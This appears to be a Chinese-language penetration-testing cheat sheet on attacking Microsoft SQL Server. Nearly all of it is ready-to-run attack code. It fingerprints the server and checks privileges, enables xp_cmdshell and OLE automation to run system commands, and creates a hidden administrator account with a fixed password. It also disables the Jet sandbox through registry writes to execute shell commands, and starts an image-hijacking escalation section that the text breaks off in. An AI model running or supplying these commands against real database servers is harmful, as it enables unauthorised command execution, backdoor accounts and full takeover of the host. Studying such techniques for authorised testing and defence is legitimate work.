SQLServer 2019之前的数据库SA用户都是`nt service\SYSTEM`

在2019版本以及之后的版本都被降权为`nt service\mssqlserver`



默认端口号：1433



权限级别

SA：系统管理员，SQLServer 最高权限，可进行数据库操作，文件管理，命令执行，在2019版本之前注册表读取权限是最高的SYSTEM

db：数据库所有者，只有文件管理权限

public：游客权限



# 攻击常用查询

```mssql
(SELECT count(*) from sysobjects) > 0 # 返回正常说明是mssql，且有可能是sa
SELECT @@VERSION	# 查看数据库版本
SELECT name FROM MASter..SysDatabASes ORDER BY name # 获取MSSQL中所有的数据库名
SELECT name FROM master..sysdatabases for xml path # 同上
SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype = 'U' and sysstat<200 # 查询所有数据库中的表名
SELECT name FROM sysobjects for xml path # 同上

SELECT IS_SRVROLEMEMBER('sysadmin') # 判断是否是SA权限
SELECT is_member('db_owner')        # 判断是否是db_owner权限
SELECT is_srvrolemember('public')   # 判断是否是public权限

EXEC xp_dirtree 'c:'        # 列出所有c:\文件、目录、子目录
EXEC xp_dirtree 'c:',1      # 只列c:\目录
EXEC xp_dirtree 'c:',1,1    # 列c:\目录、文件
EXEC xp_subdirs 'C:';       # 只列c:\目录
```



# xp_cmdshell 操作

> xp_cmdshell 默认在mssql 2000中是开启的，在mssql 2005之后默认禁止，但未删除。
>
> 所有，在拥有sa权限的情况下，我们可以将其开启，并以 `SYSTEM` 权限执行系统命令



相关操作如下

```mssql
# 查看 xp_cmdshell 开关状态 返回1表示组件启用
SELECT count(*) FROM master.dbo.sysobjects WHERE xtype='x' and name='xp_cmdshell'

# 开启 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;reconfigure;
EXEC sp_configure 'xp_cmdshell',1;reconfigure;

# 关闭 xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell', 0;reconfigure
```



利用 `xp_cmdshell` 执行命令

```mssql
# 以下几条命令格式都可以使用
EXEC xp_cmdshell "whoami"
master..xp_cmdshell 'whoami'    (2008版上好像用不了)
EXEC master..xp_cmdshell "whoami"
EXEC master.dbo.xp_cmdshell "ipconfig"

# 添加高权限系统用户
EXEC master..xp_cmdshell "net user test12 123.com /add" # 添加用户test12
EXEC master..xp_cmdshell "net localgroup administrators test12 /add" # 将test12添加到管理员组
EXEC master..xp_cmdshell "net user test12" # 查看添加的用户test12
```



# sp_oacreate 操作

> `sp_oacreate` 可以通过调用 `wscript.shell` 执行命令
>
> `sp_oacreate`系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合`sp_oamethod`系统存储过程调用系统`wscript.shell`来执行系统命令。`sp_oacreate`和`sp_oamethod`两个过程分别用来创建和执行脚本语言。
>
> 
>
> 系统管理员使用`sp_configure`启用`sp_oacreate`和`sp_oamethod`系统存储过程对OLE自动化过程的访问（OLE Automation Procedures）
>
> 在效果方面，`sp_oacreate、sp_oamethod`两个过程和`xp_cmdshell`过程功能类似，因此可以替换使用！



利用条件

- 获取到未降权的数据库管理员用户名密码
- sql server 允许远程连接
- OLE Automation Procedures 选项开启



相关操作如下：

```mssql
# 查看 sp_oacreate 开关状态 返回1表示组件启用
SELECT count(*) FROM master.dbo.sysobjects WHERE xtype='x' and name='SP_OACREATE';

# 开启 sp_configure
EXEC sp_configure 'show advanced options',1;reconfigure;
EXEC sp_configure 'Ole Automation Procedures',1;reconfigure;

# 关闭 sp_configure
EXEC sp_configure 'show advanced options',1;reconfigure;
EXEC sp_configure 'Ole Automation Procedures',0;reconfigure;
```



利用 `sp_oacreate` 和 `sp_oamethod` 执行命令

```mssql
# 执行whoami，并将输出结果写入 c:\\sqltest.txt
# 回显0表示成功（无回显的命令执行）
declare @shell int exec sp_oacreate 'wscript.shell',@shell output 
exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\sqltest.txt';

# 删除文件
declare @result int
declare @fso_token int
exec sp_oacreate 'scripting.filesystemobject', @fso_token out
exec sp_oamethod @fso_token,'deletefile',null,'c:\sqltest.txt'
exec sp_oadestroy @fso_token
```



# sql Server 沙盒提权

> 沙盒提权的原理就是`jet.oledb`（修改注册表）执行系统命令。数据库通过查询方式调用`mdb`文件，执行参数，绕过系统本身自己的执行命令，实现`mdb`文件执行命令。



使用前提

- 需要`Microsoft.Jet.OLEDB.4.0`一般在32位系统才可以，64位机需要12.0，较复杂

- `dnary.mdb`和`ias.mdb`两个文件 在`win2003`上默认存在，也可自行准备



相关操作如下：

```mssql
# 测试 jet.oledb 能否使用 若无法使用则会报错
SELECT * FROM openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c whoami")')

# 开启Ad Hoc Distributed Queries 组件
EXEC sp_configure 'show advanced options',1 ;reconfigure ;
EXEC sp_configure 'Ad Hoc Distributed Queries',1 ;reconfigure;

	# 关闭Ad Hoc Distributed Queries 组件
	EXEC sp_configure 'show advanced options',1 ;reconfigure ;
	EXEC sp_configure 'Ad Hoc Distributed Queries',0 ;reconfigure;

# 关闭沙盒模式 回设时只需要把0改成2
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;

0：在任何所有者中禁止启用安全模式
1：为仅在允许范围内
2：必须在access模式下
3：完全开启

# 查看沙盒模式
EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

# 执行命令 - whoami
SELECT * FROM OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c whoami >c:\\sqltest.txt ")');

# 执行命令 - 创建用户
SELECT * FROM OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user testq QWEasd123 /add")');

SELECT * FROM OpenRowSet('microsoft.jet.oledb.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators testq /add")');

SELECT * FROM OpenRowSet('microsoft.jet.oledb.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user testq")');
```



# xp_regwrite提权 | 映像劫持提权

>  通过使用`xp_regwrite`存储过程对注册表进行修改，替换成任意值，造成镜像劫持。



使用前提

- 未禁止注册表编辑（即写入功能）
- xp_regwrite 启用



相关操作如下：

```mssql
# 查看xp_regwrite是否启用
SELECT count(*) FROM master.dbo.sysobjects WHERE xtype='x' and name='xp_regwrite'

# xp_regwrite开启
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_regwrite',1; RECONFIGURE;


```



